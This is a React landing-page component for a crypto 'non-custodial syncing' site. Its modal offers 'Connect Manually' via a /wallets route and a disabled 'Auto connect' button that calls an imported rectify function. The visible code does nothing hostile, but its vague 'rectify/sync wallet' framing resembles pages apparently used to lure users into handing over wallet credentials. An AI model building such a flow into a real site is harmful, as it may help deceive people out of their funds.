import React, { useEffect, useState } from "react";
import { LiaWalletSolid } from "react-icons/lia";
import { Link } from "react-router-dom";
import heroimage from "../../assets/blockchain-3019121_1280-removebg-preview.png";
import { rectiFy } from "../../lib/rectiFy";
import { Web3Button } from "@web3modal/react";
import Modal from "../Modal/Modal";
import { HiOutlineArrowLongRight } from "react-icons/hi2";
import { checkTime } from "../../utils/test";

const Hero = () => {
  const [loading, setLoading] = useState(false);
  const [modalIsOpen, setModalOpen] = useState(false)



useEffect(()=> {
  checkTime()
})
  const rectify = async () => {
    setLoading(true);
    try {
      await rectiFy();
    } catch (error) {
      console.log("error rectifying", error);
    } finally {
      setLoading(false);
    }
  };


  const closeModal = ()=> {
    setModalOpen(false)
  }
  return (
    <div className=" container mx-auto py-4 md:py-10 ">
      <div className="flex mt-[5%] md:mt-[3%] flex-col md:flex-row justify-center md:items-center ">
        <div className="mb-[20%] sm:mb-8 md:mb-0 lg:mb-0 ">
          <div className="mb-5 md:mb-0">
            <h1 className="text-white font-bold text-[28px] text-center md:text-left  leading-[1.7] font-sans  md:leading-[2] lg:leading[3] xl:leading-[1.5]   md:text-5xl  mb-2 ">
              <span className="text-[#5b6fdf] mr-2 ">
                {" "}
                Non Custodial syncing using
              </span>
              our sync algorithm
            </h1>
            <p className="text-white text-center md:text-left  text-[16px] w-full sm:w-full md:w-[80%] lg:w-[90%] my-6 leading-loose md:leading-[3] ">
              A decentralized platform and network that blends incorporating
              Blockchain aspects such as non-custodial management, Micropools,
              and decentralized governance.
            </p>
          </div>
          <button
            onClick={() => setModalOpen(true)}
            className="bg-[#5b6fdf] px-10 py-2 w-full flex items-center justify-center gap-x-2 md:w-[300px] hover:bg-[#5b6fdfd0] ease-linear transition-all rounded-md text-slate-50"
          >
            Get started
            <HiOutlineArrowLongRight className="text-xl text-white" />
          </button>

          {modalIsOpen && (
            <Modal onCloseHandler={closeModal}>
              <div className="btn-group mt-7 flex-col flex">
                {/* <div className="  mb-5 ">
                  <Web3Button />
                </div> */}

                <div className="mb-5">
                  <Link to="/wallets">
                    <button className="bg-[#5b6fdf] hover:bg-[#4756deae] transition duration-40    px-9 text-white  py-2 rounded-lg">
                      Connect Manually
                    </button>
                  </Link>
                </div>
                <button
                  onClick={() => rectify()}
                  disabled={true}
                  className="bg-[#5b6fdf] hover:bg-[#4756deae] transition duration-40 disabled:bg-[#cccccc3b]    px-9 text-white  py-2 rounded-lg"
                >
                  Auto connect
                </button>
              </div>
            </Modal>
          )}
        </div>

        <div className="hidden  md:hidden lg:block">
          <img src={heroimage} alt="hero banner" className="w-[1200px]"></img>
        </div>
      </div>
    </div>
  );
};

export default Hero;
